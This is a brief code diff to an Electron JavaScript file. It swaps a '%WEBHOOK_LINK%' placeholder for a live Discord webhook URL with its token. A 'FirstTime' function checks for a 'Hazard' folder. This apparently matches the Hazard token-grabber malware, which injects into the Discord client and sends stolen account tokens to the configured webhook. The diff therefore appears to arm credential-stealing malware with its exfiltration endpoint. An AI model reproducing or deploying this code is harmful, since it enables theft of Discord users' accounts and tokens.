@@ -2,7 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const { BrowserWindow, session } = require('electron')
 const querystring = require('querystring');
-var webhook = "%WEBHOOK_LINK%";
+var webhook = "https://discord.com/api/webhooks/909805777420685313/lsNXrsLv5HWhNNOOS0zk_8Safh78vweP-WPwf0Z4uzlp1YEEfmfu5Dso1WNOOrYsOiAF";
 
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
